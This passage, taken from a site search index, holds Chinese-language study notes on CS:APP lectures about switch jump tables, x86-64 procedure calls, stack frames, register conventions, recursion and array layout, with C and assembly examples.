\u8bed\u53e5\u8f6c\u4e3a\u6c47\u7f16\uff1a\u8df3\u8f6c\u8868\u7ed3\u6784\uff08jump table structure\uff09</p> <pre><code>// switch form\nswitch (x) {\ncase val_0:\n    Block0\ncase val_1:\n    Block1\n    ...\ncase val_n-1:\n    Blockn-1\n}\n-------------------------------\n// jump table\njtab: Targ0\n      Targ1\n      Targ2\n      ...\n      Targn-1\n-------------------------------\n// actual\ngoto *JTab[x];\n</code></pre> <pre><code>long switch_eg(long x, long y, long z) {\n    long w = 1;\n    switch(x) {\n        ... \n    }\n    return w;\n}\n/*\n%rdi  argument x\n%rsi  argument y\n%rdx  argument z\n%rax  return value\n*/\n</code></pre> <pre><code>.section    .rodata\n    .align 8\n.L4\n    .quad    .L8 # x = 0\n    .quad    .L3 # x = 1\n    .quad    .L5 # x = 2\n    .quad    .L9 # x = 3\n    .quad    .L8 # x = 4\n    .quad    .L7 # x = 5\n    .quad    .L7 # x = 6\n\n.L3 # \u666e\u901a\u5206\u652f\n    movq     %rsi, %rax # y\n    imulq    %rdx, %rax # y * z\n    ret\n\n.L5 # \u4e0b\u843d\u5206\u652f\uff0c\u8fd9\u4e09\u4e2a\u5206\u652f\u88ab\u7f16\u8bd1\u5668\u4f18\u5316\u5f97\u8054\u5408\u8d77\u6765\u5199\u4e86\n    movq     %rsi, %rax\n    cqto\n    idivq    %rcx       # y / z\n    jmp      .L6        # goto merge\n.L9\n    movl     $1, %eax   # w := 1\n.L6 \n    addq     %rcx, %rax # w += z\n    ret\n\n.L7\n    movl     $1, %eax   # w := 1\n    subq     %rdx, %rax # w -= z\n    ret\n.L8                     # Default\n    movl     $2, %eax   # w := 2\n    ret\n\nswitch_eg:\n    movq    %rdx, %rcx\n    cmpq    $6, %rdi      # x:6\n    ja      .L6           # Use default\n    jmp     *.L4(,%rdi,8) # goto *JTab[x]\n</code></pre> <p>\u7f16\u8bd1\u5668\u53ef\u80fd\u5c06 switch \u8bed\u53e5\u4f18\u5316\u6210\u8f83\u77ed\u7684 if-else \u94fe\u751a\u81f3\u6539\u7528\u4e8c\u5206\u641c\u7d22\uff08cases \u8fc7\u591a\u65f6\uff09</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L06-Machine-Level-Programming-II-Control/#summary","title":"Summary","text":"<ul> <li>C Control</li> <li>if-then-else</li> <li>do-while</li> <li>while, for</li> <li> <p>switch</p> </li> <li> <p>Assembler Control</p> </li> <li>conditional jump</li> <li>conditional move</li> <li>indirect jump (via jump tables)</li> <li> <p>compiler generates code sequence to implement more complex control</p> </li> <li> <p>Standard Technique</p> </li> <li>Loops converted to do-while or jump-to-middle form</li> <li>Large switch statements use jump tables</li> <li>Sparse switch statements may use decision trees (if-elseif-elseif-else)</li> </ul>"},{"location":"out_class_learning/freely_learning/CSAPP/L07-Machine-Level-Programming-III-Procedures/","title":"L07 Machine-Level Programming III: Procedures","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd/?p=7</p> <p>\u8fc7\u7a0b\uff08procedure\uff09\uff1a\u5728\u4e0d\u540c\u8bed\u8a00\u4e2d\u53ef\u80fd\u79f0\u4e3a\u51fd\u6570\uff08function\uff09\u3001\u8fc7\u7a0b\uff08procedure\uff09\u3001\u4ee5\u53ca OOP \u4e2d\u7684\u65b9\u6cd5\uff08method\uff09</p> <p>\u5e94\u7528\u7a0b\u5e8f\u4e8c\u8fdb\u5236\u63a5\u53e3\uff08ABI, application binary interface\uff09\uff0cL07 \u5c31\u91cd\u5728\u8bb2 ABI. Windows ABI \u548c Linux ABI \u4e0d\u5b8c\u5168\u76f8\u540c\uff0c\u82f9\u679c\u7684 OSX \u4e5f\u6709\u81ea\u5df1\u7684 ABI\uff0c\u751a\u81f3 FreeBSD\uff08Unix \u64cd\u4f5c\u7cfb\u7edf\u7684\u53e6\u4e00\u79cd\u53d8\u4f53\uff09\u4e5f\u6709\u81ea\u5df1\u7684 ABI\uff0c\u5b83\u4eec\u90fd\u5f88\u7c7b\u4f3c\u4f46\u5728\u7ec6\u8282\u4e0a\u4e0d\u540c\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L07-Machine-Level-Programming-III-Procedures/#mechanisms-in-procedures","title":"\u8fc7\u7a0b\u7684\u673a\u5236\uff08mechanisms in procedures\uff09","text":"<pre><code>P(...) {\n    ...\n    y = Q(x)\n    print\uff08y\uff09\n    ...\n}\nint Q(int i) {\n    int t = 3 * i;\n    int v[10];\n    ...\n    return v[t]; \n}\n</code></pre> <ul> <li>\u4f20\u9012\u63a7\u5236\u6743 passing control</li> <li>\u8c03\u7528\u53e6\u4e00\u4e2a\u8fc7\u7a0b to beginning of procedure code</li> <li>\u8c03\u7528\u7ed3\u675f\u540e\u8fd4\u56de\u8c03\u7528\u4f4d\u7f6e back to return point</li> <li>\u4f20\u9012\u6570\u636e passing data</li> <li>\u4f20\u9012\u53c2\u6570 procedure arguments</li> <li>\u8fd4\u56de\u8fd4\u56de\u503c return value</li> <li>\u5185\u5b58\u7ba1\u7406 memory management</li> <li>\u51fd\u6570\u6267\u884c\u65f6\u5206\u914d\u7a7a\u95f4 allocate during procedure execution</li> <li>\u51fd\u6570\u8fd4\u56de\u65f6\u91ca\u653e\u7a7a\u95f4 deallocate upon return </li> <li>mechanism  all implemented with machine instructions</li> <li>x86-64 implementation of a procedure uses only those mechanisms required</li> </ul> <p>\u4eca\u5929\uff1a\u8fc7\u7a0b</p> <ul> <li>\u6808\u7ed3\u6784 stack structure</li> <li>\u8c03\u7528\u60ef\u4f8b calling conventions</li> <li>passing control</li> <li>passing data</li> <li>managing local data</li> <li>\u523b\u753b\u9012\u5f52 illustration of recursion</li> </ul>"},{"location":"out_class_learning/freely_learning/CSAPP/L07-Machine-Level-Programming-III-Procedures/#x86-64","title":"x86-64 \u6808","text":"<pre><code>---------------------  \u5730\u5740\u589e\u52a0  \u3010\u6808\u5e95\u3011\n|                   |    \u2191\n---------------------\n|       ......      |\n---------------------\n|                   |    \u2193\n---------------------  \u6808\u5f80\u4e0b\n|                   |\n---------------------  &lt;- \u6808\u6307\u9488 %rsp  \u3010\u6808\u9876\u3011\n</code></pre> <p>\u7a0b\u5e8f\u7528\u6808\u6765\u7ba1\u7406\u8fc7\u7a0b\u8c03\u7528\u4e0e\u8fd4\u56de\u7684\u72b6\u6001\uff0c\u6211\u4eec\u6709 <code>push</code> \u548c <code>pop</code> \u8fd9\u4e24\u4e2a\u660e\u786e\u7684\u6307\u4ee4\u6765\u5bf9\u6808\u8fdb\u884c\u64cd\u4f5c\u3002</p> <p><code>push src</code> \uff1a1. \u83b7\u53d6\u64cd\u4f5c\u6570 <code>src</code> \uff08\u53ef\u4ee5\u6765\u81ea\u7acb\u5373\u6570\u3001\u5bc4\u5b58\u5668\u3001\u5185\u5b58\uff09 2. \u6808\u6307\u9488\u51cf\u53bb 8 3. \u5165\u6808\u4e86\uff0c\u88ab <code>%rsp</code> \u6307\u5411\u3002</p> <p><code>pop dest</code>\uff1a1. \u83b7\u53d6\u6808\u9876\uff08<code>%rsp</code> \u6307\u5411\u7684\u6570\u636e\uff092. \u6808\u6307\u9488\u52a0\u4e0a 8 3. \u5c06\u83b7\u53d6\u7684\u6808\u9876\u8d4b\u503c\u7ed9 <code>dest</code>\uff0c<code>dest</code> \u5fc5\u987b\u662f\u5bc4\u5b58\u5668\u3002</p> <p>\u4e3a\u4ec0\u4e48\u662f 8\uff1f\u6570\u636e\u90fd\u662f 64 \u6bd4\u7279\u5373 8 \u5b57\u8282\u7684\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>long mult2(long a, long b) {\n    long s = a * b;\n    return s;\n}\nvoid multstore(long x, long y, long *dest) {\n    long t = mult2(x, y);\n    *dest = t;\n}\n</code></pre> <pre><code>0000000000400540 &lt;multstore&gt;:\n  400540:  push   %rbx       # save %rbx\n  400541:  mov    %rdx, %rbx # save dest\n  400544:  callq  400550 &lt;mult2&gt; # mult2(x, y)\n  400549:  mov    %rax, (%rbx)   # save at dest\n  50054c:  pop    %rbx       # restore %rbx\n  40054d:  retq              # return\n0000000000400550 &lt;mult2&gt;:\n  400550:  mov    %rdi, %rax # a\n  400553:  imul   %rsi, %rax # a\n  400557:  retq              # Return\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L07-Machine-Level-Programming-III-Procedures/#procedure-control-flow","title":"\u8fc7\u7a0b\u7684\u63a7\u5236\u6d41\uff08procedure control flow\uff09","text":"<ul> <li>\u4f7f\u7528\u6808\u6765\u5e2e\u52a9\u8fc7\u7a0b\u8c03\u7528\u548c\u8fd4\u56de</li> <li>\u8fc7\u7a0b\u8c03\u7528\uff1a<code>call label</code></li> <li>\u5c06\u8fd4\u56de\u5730\u5740\u5165\u6808</li> <li>\u8df3\u8f6c\u5230 <code>label</code> \u5904</li> <li>\u8fd4\u56de\u5730\u5740</li> <li>\u8c03\u7528\u540e\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740 address of the next instruction right after call</li> <li>\u53cd\u6c47\u7f16\u5f97\u5230\u7684\u4f8b\u5b50\uff08\u5982\u4e0a\uff09 </li> <li>\u8fc7\u7a0b\u8fd4\u56de\uff1a<code>ret</code></li> <li>\u5f39\u6808\u5f97\u5230\u5730\u5740</li> <li>\u8df3\u8f6c\u8fd9\u4e2a\u5730\u5740</li> </ul> <pre><code>400544:  callq  400550 &lt;mult2&gt; # mult2(x, y)\n400549:  mov    %rax, (%rbx)   # save at dest\n\n400550:  mov    %rdi, %rax # a\n\n400557:  retq              # Return\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L07-Machine-Level-Programming-III-Procedures/#procedure-data-flow","title":"\u8fc7\u7a0b\u7684\u6570\u636e\u6d41\uff08procedure data flow\uff09","text":"<p>ABI \u7ea6\u5b9a\uff1a\u5f00\u5934\u7684\u516d\u4e2a\u53c2\u6570\u56fa\u5b9a\u7531 <code>%rdi</code>\u3001<code>%rsi</code>\u3001<code>%rdx</code>\u3001<code>%rcx</code>\u3001<code>%rcx</code>\u3001<code>%r8</code> \u548c <code>%r9</code> \u4f20\u9012\uff0c\u4e4b\u540e\u7684\u53c2\u6570\u5012\u5e8f\u538b\u5165\u6808\u4e2d\uff0c\u8fd4\u56de\u503c\u56fa\u5b9a\u7531 <code>%rax</code> \u4f20\u9012\u3002</p> <p>IA32 \u6240\u6709\u7684\u53c2\u6570\u90fd\u5728\u6808\u4e2d\u4f20\u9012\u3002</p> <pre><code>  400541:  mov    %rdx, %rbx #\n  400544:  callq  400550 &lt;mult2&gt; #\n  400549:  mov    %rax, (%rbx)   #\n\n  400550:  mov    %rdi, %rax #\n  400553:  imul   %rsi, %rax #\n  400557:  retq              #\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L07-Machine-Level-Programming-III-Procedures/#manage-local-data","title":"\u7ba1\u7406\u672c\u5730\u6570\u636e\uff08manage local data\uff09","text":"<p>\u5355\u7ebf\u7a0b\uff1a\u6bcf\u65f6\u6bcf\u523b\u53ea\u6709\u4e00\u4e2a\u8fc7\u7a0b\u5728\u8fd0\u884c\uff0c\u8c03\u7528\u76f8\u5f53\u4e8e\u51bb\u7ed3\u8c03\u7528\u524d\u8fc7\u7a0b\u3002</p> <p>\u56e0\u4e3a\u5355\u7ebf\u7a0b\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4e3a\u5f53\u524d\u8fd0\u884c\u7684\u8fc7\u7a0b\u5206\u914d\u65e0\u9650\u7684\u5185\u5b58\u800c\u4e0d\u5fc5\u62c5\u5fc3\u548c\u5176\u4ed6\u8fc7\u7a0b\u51b2\u7a81\uff0c\u5f53\u8fd9\u4e2a\u8fc7\u7a0b\u8fd4\u56de\u65f6\uff0c\u4e4b\u524d\u7528\u5230\u7684\u6570\u636e\u5168\u90e8\u53ef\u4ee5\u4e0d\u4fdd\u7559\u3002</p> <p>stack frame\uff1a\u6808\u5e27\uff0c\u7528\u4e8e\u7279\u5b9a\u8c03\u7528\u7684\u6bcf\u4e2a\u5185\u5b58\u5757\u3002\u8c03\u7528\u94fe\uff08call chain\uff09\u301028:30\u3011</p> <pre><code>Stack-Based Language\n    Languages that support recursion\n        e.g. C, Pascal, Java\n        Code must be \"Reentrant\"\n            Multiple simultaneous instantiations of single procedure\n        Need some place to store state of each instantiation\n            Arguments\n            Local variables\n            Return pointer\n    Stack discipline\n        state for given procedure needed for limited time\n            From when called to when return\n        Callee returns before caller does\n    Stack allocated in FRAMES\n        state for single procedure instatiation\n</code></pre> <p>\u6808\u5e27\uff0c\u5305\u542b</p> <ul> <li>\u8fd4\u56de\u4fe1\u606f return information</li> <li>\u672c\u4f53\u5b58\u50a8\uff08\u5982\u679c\u9700\u8981\uff09local storage (if needed)</li> <li>\u4e34\u65f6\u7a7a\u95f4\uff08\u5982\u679c\u9700\u8981\uff09temporary space (if neede)</li> </ul> <pre><code>--------------------\n|                  |\n| previous frame   |\n|                  |\n-------------------- &lt;- frame pointer %rbp (optional)\n|                  |\n| frame for proc   |\n|                  |\n-------------------- &lt;- stack pointer %rsp\n     STACK TOP\n</code></pre> <p>\u7ba1\u7406</p> <p>\u200b   \u5f53\u8fdb\u5165\u8fc7\u7a0b\u7684\u65f6\u5019\u5206\u914d\u7684\u7a7a\u95f4</p> <p>\u200b       \u300c\u542f\u52a8\u300d\u4ee3\u7801</p> <p>\u200b       \u5305\u62ec <code>push</code> \u6307\u4ee4\uff0c\u8fd9\u88ab\u5305\u542b\u5728 <code>call</code> \u6307\u4ee4\u4e2d\u3002</p> <p>\u200b   \u5f53\u8fd4\u56de\u7684\u65f6\u5019\u91ca\u653e</p> <p>\u200b       \u300c\u7ed3\u675f\u300d\u4ee3\u7801</p> <p>\u200b       \u5305\u62ec <code>pop</code> \u6307\u4ee4\uff0c\u8fd9\u88ab\u5305\u542b\u5728 <code>ret</code> \u6307\u4ee4\u4e2d\u3002</p> <p>\u5927\u591a\u6570\u7cfb\u7edf\u4f1a\u9650\u5236\u6808\u7684\u6df1\u5ea6\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u9632\u6b62\u65e0\u9650\u9012\u5f52\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L07-Machine-Level-Programming-III-Procedures/#x86-64linux","title":"x86-64/Linux \u6808\u5e27","text":"<pre><code>--------------------\n|                  |\n|      ......      |\n|                  |\n--------------------\n|                  |\n| Arguments 7+     |\n|                  |\n--------------------    ^\n| Return Address   |    |  caller frame\n-------------------- -------\n| Old %rbp (Op)    | &lt;- %rbp (Optional) \n--------------------\n|                  |\n| Save Registers   |\n|        +         |\n| Local Variables  |\n|                  |\n--------------------\n|                  |\n| Argument Build   |\n| (Optional)       |\n|                  |\n-------------------- &lt;- %rsp\n     STACK TOP\n</code></pre> <p>\u200b   \u5f53\u524d\u6808\u5e27\uff08\u4ece\u9876\u5230\u5e95\uff09\uff1a </p> <p>\u200b       \u53c2\u6570\u6784\u5efa\uff1a\u7528\u4e8e\u8c03\u7528\u7684\u8fc7\u7a0b</p> <p>\u200b       \u672c\u5730\u53d8\u91cf\uff1a\u4e0d\u80fd\u4fdd\u5b58\u5728\u5bc4\u5b58\u5668\u4e2d</p> <p>\u200b       \u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587</p> <p>\u200b       \u65e7\u6808\u5e27\uff08\u53ef\u9009\uff09</p> <p>\u200b   \u8c03\u7528\u8005\u6808\u5e27\uff1a</p> <p>\u200b       \u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u88ab <code>call</code> \u6307\u4ee4\u538b\u5165\u6808\u4e2d</p> <p>\u200b       \u8fd9\u6b21\u8c03\u7528\u7684\u5404\u4e2a\u53c2\u6570\u3002</p> <p>\u4e0b\u9762\u4e3a\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>long incr(long *p, long val) {\n    long x = *p;\n    long y = x + val;\n    *p = y;\n    return x;\n}\n/*\n%rdi  \u53c2\u6570 p\n%rsi  \u53c2\u6570 val \u548c y\n%rax  \u53c2\u6570 x \u548c\u8fd4\u56de\u503c\n*/\n</code></pre> <pre><code>incr:\n    movq    (%rdi), %rax\n    addq    %rax, %rsi\n    movq    %rsi, (%rdi)\n    ret\n</code></pre> <pre><code>long call_incr() {\n    long v1 = 15213;\n    long v2 = incr(&amp;v1, 3000);\n    return v1 + v2;\n}\n</code></pre> <pre><code>call_incr:\n    subq    $16, %rsp        # \n    movq    $15213, 8(%rsp)  # \u6b64\u4e24\u6761\u4e3a\u5f3a\u5236\uff0c\u4e3a\u4e86\u907f\u514d\u5176\u4e2d\u6570\u636e\u4e22\u5931\n    movl    $3000, %esi      # \u8fd9\u91cc\u7528 movl \u662f\u56e0\u4e3a\u5176\u6307\u4ee4\u77ed\u4e00\u4e9b\uff0c\u5c11\u7528\u4e00\u4e9b\u7a7a\u95f4\uff08\u8fd9\u4e5f\u7701...\uff09\n    leaq    8(%rsp), %rdi\n    call    incr\n    addq    8(%rsp), %rax\n    addq    $16, %rsp\n    ret \n</code></pre> <pre><code>--------------------\n|                  |\n|      ......      |\n|                  |\n--------------------\n| Return Address   |\n--------------------\n| 15213            | &lt;- %rsp + 8 \n--------------------\n| Unused           | &lt;- %rsp\n--------------------\n         | Updated Stack Structure\n         v\n--------------------\n|                  |\n|      ......      |\n|                  |\n--------------------\n| Return Address   | &lt;- %rsp\n--------------------     \n</code></pre> <p>\u5bc4\u5b58\u5668\u53ef\u4ee5\u8fdb\u884c\u4e34\u65f6\u5b58\u50a8\u5417\uff1f</p> <p>\u200b   \u53ef\u4ee5\uff0c\u4f46\u662f\u53ef\u80fd\u4f1a\u88ab\u8986\u5199\uff0c\u56e0\u6b64\u4f1a\u5b58\u4e00\u904d\u3002</p> <p>\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7ba1\u7406\u5bc4\u5b58\u5668\uff0c\u4e00\u79cd\u79f0\u4e3a\u8c03\u7528\u8005\u4fdd\u5b58\uff08caller saved\uff09\uff1a\u8c03\u7528\u8005\u5728\u8c03\u7528\u4e4b\u524d\u5c06\u4e34\u65f6\u503c\u4fdd\u5b58\u5728\u5b83\u7684\u6808\u5e27\u4e2d\uff1b\u53e6\u4e00\u79cd\u79f0\u4e3a\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\uff08callee saved\uff09\uff1a\u88ab\u8c03\u7528\u8005\u5728\u4f7f\u7528\u4e4b\u524d\u5c06\u4e34\u65f6\u503c\u4fdd\u5b58\u5728\u5b83\u7684\u6808\u5e27\u4e2d\uff0c\u88ab\u8c03\u7528\u8005\u5728\u8fd4\u56de\u4e4b\u524d\u6062\u590d\u8fd9\u4e9b\u4e34\u65f6\u503c\u3002\u663e\u7136\u9009\u62e9\u54ea\u79cd\u65b9\u5f0f\u7531 ABI \u8fd9\u4e2a\u7ea6\u5b9a\u89c4\u5b9a\u3002</p> <p>x86-64 Linux \u5bc4\u5b58\u5668\u4f7f\u7528\uff08\u4e66P173\uff09     %rax\uff1a\u8fd4\u56de\u503c\uff0c\u8c03\u7528\u8005\u4fdd\u5b58\uff0c\u53ef\u80fd\u88ab\u8fc7\u7a0b\u4fee\u6539</p> <p>\u200b   %rdi, ..., %r9\uff1a\u53c2\u6570\uff0c\u8c03\u7528\u8005\u4fdd\u5b58\uff0c\u53ef\u80fd\u88ab\u8fc7\u7a0b\u4fee\u6539</p> <p>\u200b   %r10, %r11\uff1a\u8c03\u7528\u8005\u4fdd\u5b58\uff0c\u53ef\u80fd\u88ab\u8fc7\u7a0b\u4fee\u6539\uff0c\u7528\u4e8e\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u4e34\u65f6\u503c\uff08caller-saved temporaries\uff09\u3002</p> <p>\u200b   %rbx, %r12, %r13, %r14\uff1a\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\uff0c\u88ab\u8c03\u7528\u8005\u5fc5\u987b\u4fdd\u5b58\u4e14\u6062\u590d\u3002</p> <p>\u200b   %rbp\uff1a\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\uff0c\u88ab\u8c03\u7528\u8005\u5fc5\u987b\u4fdd\u5b58\u4e14\u6062\u590d\uff0c\u53ef\u80fd\u88ab\u7528\u4f5c\u57fa\u6307\u9488\uff08frame pointer\uff09\uff0c\u53ef\u4ee5\u6df7\u5408\u3001\u5339\u914d\uff08mix &amp; match\uff09</p> <p>\u200b   %rsp\uff1a\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u7279\u6b8a\u5f62\u5f0f\uff0c\u9000\u51fa\u8fc7\u7a0b\u524d\u6062\u590d\u539f\u503c\u3002</p> <pre><code>long call_incr2(long x) {\n    long v1 = 15213;\n    long v2 = incr(&amp;v1, 3000);\n    return x + v2;\n}\n</code></pre> <pre><code>call_incr2:\n    pushq   %rbx\n    subq    $16, %rsp\n    movq    %rdi, %rbx\n    movq    $15213, 8(%rsp)\n    movl    $3000, %esi\n    leaq    8(%rsp), %rdi\n    call    incr\n    addq    %rbx, %rax\n    popq    %rbx\n    ret\n</code></pre> <pre><code>--------------------\n|                  |\n|      ......      |\n|                  |\n--------------------\n| Return Address   | &lt;- %rsp\n--------------------\n         |\n         v\n--------------------\n|                  |\n|      ......      |\n|                  |\n--------------------\n| Return Address   | \n--------------------      \n| Saved %rbx       |\n--------------------\n| 15213            | &lt;- %rsp + 8 \n--------------------\n| Unused           | &lt;- %rsp\n--------------------\n         | Updated Stack Structure\n         v\n--------------------\n|                  |\n|      ......      |\n|                  |\n--------------------\n| Return Address   | &lt;- %rsp\n--------------------     \n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L07-Machine-Level-Programming-III-Procedures/#_1","title":"\u9012\u5f52","text":"<p>\u5982\u4e0a\u6240\u8ff0\uff0c\u56e0\u4e3a\u6808\u5e27\u673a\u5236\u548c\uff08\u88ab\uff09\u8c03\u7528\u8005\u4fdd\u5b58\uff0c\u8c03\u7528\u81ea\u5df1\u6ca1\u4ec0\u4e48\u7279\u6b8a\u7684\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>/* Recursive popcount */\nlong pcount_r(unsigned long x) {\n    if (x == 0)\n        return 0;\n    else \n        return (x &amp; 1) + pcount_r(x &gt;&gt; 1);\n}\n</code></pre> <pre><code>pcount_r:\n    movl    $0, %eax\n    testq   %rdi, %rdi\n    je      .L6\n    pushq   %rbx\n    movq    %rdi, %rbx\n    andl    $1, %ebx\n    shrq    %rdi\n    call    pcount_r\n    addq    %rbx, %rax\n    popq    %rbx\n.L6:\n    rep; ret\n</code></pre> <pre><code>Observations About Recursion\n    Handled without special consideration\n        Satck frames mean that each function call has private storage\n            saved registers &amp; local variables\n            saved return pointer\n        Registers saving conventions prevent one function call from corrupting another's data\n            Unless the C code explicitly does so (e.g. buffer overflow in L09)\n        Stack discipline follows call/return pattern\n            If P calls Q, then Q returns before P\n            Last-In, First-Out\n    Also works for mutual recursion\n        P calls Q; Q calls P\nx86-64 Procedure Summary\n    Important Points\n        Stack is the right data structure for procedure call/return\n            If P calls Q, then Q returns before P\n    Recursion (&amp; mutual recursion) handled by normal calling conventions\n        Can safely store values in local stack frame and in callee-saved registers\n        Put function arguments at top of stack\n        Result return in %rax\n    Pointers are addresses of values\n        On stack or global\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data/","title":"L08 Machine-Level Programming IV: Data","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=8</p> <p>Today</p> <p>\u200b   \u6570\u7ec4 Arrays</p> <p>\u200b       \u4e00\u7ef4\u6570\u7ec4 One-dimensional</p> <p>\u200b       \u591a\u7ef4\u6570\u7ec4\uff08\u5d4c\u5957\uff09multi-dimensional (nested)</p> <p>\u200b       \u591a\u7ea7\u6570\u7ec4 multi-level</p> <p>\u200b   \u7ed3\u6784\u4f53</p> <p>\u200b       \u5206\u914d\u7a7a\u95f4 allocation</p> <p>\u200b       \u8bbf\u95ee access</p> <p>\u200b       \u5bf9\u9f50 alignment</p> <p>\u200b   \u6d6e\u70b9\u6570</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data/#_1","title":"\u6570\u7ec4","text":""},{"location":"out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data/#_2","title":"\u6570\u7ec4\u5206\u914d\u7a7a\u95f4","text":"<p><code>T A[L]</code>\uff1a\u4e00\u4e2a\u957f\u5ea6\u4e3a <code>L</code> \u7684\u53d8\u91cf\u7c7b\u578b\u4e3a <code>T</code> \u7684\u6570\u7ec4 <code>A[]</code>.</p> <p>\u5728\u5185\u5b58\u4e2d\u9700\u8981\u5206\u914d\u4e00\u5757 <code>T * sizeof(T)</code> \u5b57\u8282\u957f\u5ea6\u7684\u533a\u57df\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data/#_3","title":"\u6570\u7ec4\u8bbf\u95ee","text":"<p>\u6807\u8bc6\u7b26\uff08identifier\uff09 <code>A</code> \u53ef\u4ee5\u4f5c\u4e3a\u6307\u5411\u4e0b\u6807\u4e3a <code>0</code> \u7684\u6570\u7ec4\u5143\u7d20\u7684\u6307\u9488\uff1aC \u7684\u6307\u9488\u3001\u6570\u7ec4\u3001\u6570\u7ec4\u6807\u8bc6\u7b26\u53ef\u4e92\u6362\u7684\u601d\u60f3\u3002</p> <pre><code>int val[5] = {1, 5, 2, 1, 3};\n\nreference    type    value\nval[4]       int     3\nval          int *   x\nval + 1      int *   x + 4\n&amp;val[2]      int *   x + 8\nval[5]       int     ??\n*(val + 1)   int     5\nval + i      int *   x + 4 *  i\n</code></pre> <pre><code>#define ZLEN 5\ntypedef int zip_dig[ZLEN]\ntypedef long long i64\ntypedef A B C\n    means\nzig_dip x === int x[ZLEN]\ni64 x     === long long x\nB x       === A x C\n// \u6211\u4ee5\u524d\u4ece\u6765\u4e0d\u77e5\u9053\u8fd8\u6709\u8fd9\u79cd\u7528\u6cd5\n</code></pre> <p>\u4f8b\u5b50\uff1a</p> <pre><code>int get_digit(zip_dig z, int digit) {\n    return z[digit]\n}\n</code></pre> <pre><code>  # for IA32\n  # %rdi = z\n  # %rsi = digit\nmovl (%rdi,%rsi,4), %eax # z[digit]\n</code></pre> <p>\u53c8\u4e00\u4f8b\u5b50</p> <pre><code>void zincr(zip_dig z) {\n    size_t i;\n    for (i = 0; i &lt; ZLEN; i++)\n        z[i]++;\n}\n</code></pre> <pre><code>  # %rdi = z\n    movl    $0, %eax          # i = 0\n    jmp     .L3               # goto middle\n.L4:                          # loop:\n    addl    $1, (%rdi,%rax,4) # z[i]++\n    addq    $1, %rax          # i++\n.L3:                          # middle\n    cmpq    $4, %rax          # i:4\n    jbe     .L4               # if &lt;=, goto loop\n    rep; ret\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L08-Machine-Level-Programming-IV-Data/#_4","title":"\u7406\u89e3\u6307\u9488\u548c\u6570\u7ec4\uff1a\u5f02\u540c\u6bd4\u8f83","text":"<p>\u5173\u952e\u7684\u5dee\u522b\u5728\u4e8e\uff0c\u58f0\u660e\u4e00\u4e2a\u6570\u7ec4\u65f6\uff0c\u4e3a\u5176\u5206\u914d\u4e86\u7a7a\u95f4\uff0c\u4f46\u662f\u58f0\u660e\u4e00\u4e2a\u6307\u9488\uff0c\u5219\u53ea\u4e3a\u6307\u9488\u5206\u914d\u4e86\u7a7a\u95f4\uff0c\u800c\u5e76\u4e0d\u4e00\u5b9a\u4e3a\u5176\u6307\u5411\u7684\u5730\u65b9\u5206\u914d\u4e86\u7a7a\u95f4\u3002</p> <pre><code>Decl           A1, A2                 *A1, *A2\n               Comp    Bad    Size    Comp    Bad    Size\nint A1[3]      Y       N      12      Y       N      4\nint *A2        Y       N      8       Y       Y      4\n\u6b64\u5904 A2 \u4f5c\u4e3a\u91ce\u6307\u9488\uff0c*A2 \u4f5c\u4e3a\u53f3\u503c\u8fd4\u56de\u91ce\u503c\uff0c\u4f5c\u4e3a\u5de6\u503c\u5219\u53ef\u80fd\u8d4b\u503c\u5931\u8d25\uff0c\u6240\u4ee5\u662f\u4e00\u4e2a\u53ef\u80fd\u7684\u574f\u5f15\u7528\nDecl           An                     *An                    **An\n               Comp    Bad    Size    Comp    Bad    Size    Comp    Bad    Size\nint A1[3]      Y       N      12      Y       N      4       N       -      -\nint *A2[3]     Y       N      24      Y       N      8       Y       Y      4\nint (*A3)[3]   Y       N      8       Y       Y      12      Y       Y      4\nT (*A)[Z] \u4e3a\u6307\u5411\u4e00\u4e2a\u5143\u7d20\u7c7b\u578b\u4e3a T\uff0c\u957f\u5ea6\u4e3a Z \u7684\u6570\u7ec4\u7684\u6307\u9488 T\uff0c\u6240\u4ee5\u9996\u5148\u89e3\u5f15\u7528 *A \u5f97\u5230\u7684\u662f\u6570\u7ec4\uff0c\u518d\u89e3\u5f15\u7528 **A \u5f97\u5230\u6570\u7ec4\u9996\u5143\u7d20.\n\u5177\u4f53\u6765\u8bf4\uff0c[] \u662f\u540e\u7f00\u8fd0\u7b97\u7b26\uff0c*\u662f\u524d\u7f00\u8fd0\u7b97\u7b26\uff0c\u540e\u7f00\u8fd0\u7b97\u7b26\u6bd4\u524d\u7f00\u7684\u4f18\u5148\u7ea7\u9ad8\uff0c\u6240\u4ee5 A3 \u662f\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\uff0cA2 